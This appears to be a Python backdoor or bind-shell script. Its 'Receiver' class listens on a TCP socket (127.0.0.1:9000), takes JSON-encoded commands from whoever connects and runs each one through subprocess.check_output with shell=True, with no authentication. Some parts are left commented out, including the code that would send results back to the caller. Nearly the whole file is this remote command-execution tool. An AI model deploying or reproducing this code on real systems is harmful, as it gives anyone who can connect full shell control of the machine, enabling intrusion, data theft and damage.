import socket
import subprocess
import json



class Receiver:


		
	def create_socket(self):
		try:
			self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		except socket.error as e:
			print("[+] Error while creating socket : ",e)
			
	def bind_socket(self):
		try:
			self.listener.bind(("127.0.0.1",9000))
			self.listener.listen(0)

		
		except socket.error as e:
			print("[+] Error while binding socket :",e)
			
	def accept_connection(self):
	

		while True:
		
			try:
				self.conn,self.address = self.listener.accept()
				self.listener.setblocking(1)
			
				print("[+] Connection Received from : "+ str(self.address) )
				break
			except socket.error as e:
				print("[+] Error while accepting connection :",e)
				
			
			
			
		'''
		try:
			print("Waiting for connections")
			self.conn,self.address = self.listener.accept()
			print("[+] Connection Received from : "+ str(self.address) )
		
		except socket.error as e:
			print("[+] Error while accepting connection :",e)'''
		
			
	def execute_command(self,command):
	
		try:
			print("command to be fired >>>",command)
			return subprocess.check_output(command,shell=True)
		except:
			command_result = "Invalid Command"
			command_result = command_result.encode()
			
			return command_result
	
	def receive(self):
	
		result=b''
		while True:
			try:
				result = result + self.conn.recv(1024)
				#command=json.loads(command)
				#result = result.decode()
				print("incoming data>>",result)
				#print("incoming data>>",type(result))
				return json.loads(result)
			except ValueError:
				print("More data is pending")
				continue
				
	def normal_receive(self):
			self.accept_connection()
			command =  self.conn.recv(1024)
			print("[+]command received >>",command)
			command = json.loads(command)
			command_result = self.execute_command(command).decode()
			
			self.conn.close()
			return command_result
			
		
		
	def json_send(self,command):
		json_command = json.dumps(command)
		json_command = json_command.encode()
	
		
		self.conn.send(json_command)
		
	def run(self):
		self.accept_connection()
		while True:
		
			

			
			command = self.receive()
			print("[+]command received >>",command)
			command_result = self.execute_command(command).decode()
			print("[+] command>>>>>>>",command)

			#self.json_send(command_result)
			
		self.conn.close()
		
receiver=Receiver()
receiver.create_socket()
receiver.bind_socket()
#receiver.run()
result = receiver.normal_receive()
print("[+] Command Result >>>> ",result)
print(type(result))